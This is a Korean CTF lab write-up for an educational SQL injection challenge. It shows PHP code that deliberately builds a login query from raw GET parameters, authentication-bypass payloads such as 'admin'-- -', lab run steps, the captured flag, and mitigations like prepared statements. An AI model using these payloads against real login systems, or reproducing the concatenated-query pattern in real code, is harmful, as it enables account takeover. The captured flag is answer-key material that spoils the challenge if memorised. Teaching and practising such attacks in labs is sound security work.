# [injection] SQLi #1 — 기본 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/injection/sqli-1`
- 카테고리: injection
- 버그클래스: SQL Injection (인증 우회)
- 포트: 9201

## 취약점 분석

`challenges/injection/sqli-1/html/index.php`:

```php
$q = "SELECT userid FROM sqli1_table WHERE userid='$_GET[userid]' AND userpw='$_GET[userpw]'";
$r = $m->query($q); $uid = '';
if ($r && $r->num_rows > 0) { while ($row = $r->fetch_assoc()) { $uid = $row['userid']; } }
$m->close();
if ($uid === 'admin') { echo getenv('FLAG_SQLI_1'); }
else { echo htmlspecialchars($uid); }
```

GET 파라미터 `userid`, `userpw`가 이스케이프/파라미터 바인딩 없이 SQL 문자열에 그대로 삽입된다. 쿼리 결과의 `userid`가 문자열 `'admin'`과 정확히 일치하면 flag를 그대로 응답에 출력한다.

## 익스플로잇

`userid`에 SQL 주석(`-- `)을 삽입해 `userpw` 조건을 무력화한다.

```
userid = admin'-- -
userpw = x (아무 값)
```

실제 실행되는 쿼리:
```sql
SELECT userid FROM sqli1_table WHERE userid='admin'-- -' AND userpw='x'
```
`-- `이후가 주석 처리되어 `userpw` 조건이 사라지고, `userid='admin'` 조건만 남아 admin 계정이 조회된다.

(대안) OR 기반 페이로드:
```
userid = ' or userid='admin'-- -
userpw = x
```

## 진행 절차

1. `docker compose up -d --build sqli-1 db` 로 컨테이너 실행 (db 헬스체크 완료까지 대기)
2. `http://localhost:9201` 접속
3. 폼(GET 방식)의 `userid` 입력란에 `admin'-- -`, `userpw` 입력란에 아무 값(`x`) 입력 후 login
4. 화면에 flag가 그대로 출력됨

## 플래그

```
flag{121128d0833fafb1b3d4}
```

## 대응방안

- Prepared Statement(파라미터 바인딩) 사용 — 문자열 조립 방식의 쿼리 생성 금지
- 입력값 검증/이스케이프(당장의 임시 방편, 근본 대책은 아님)
- 최소 권한 DB 계정 사용, 에러 메시지에 민감정보(쿼리/스키마) 노출 금지
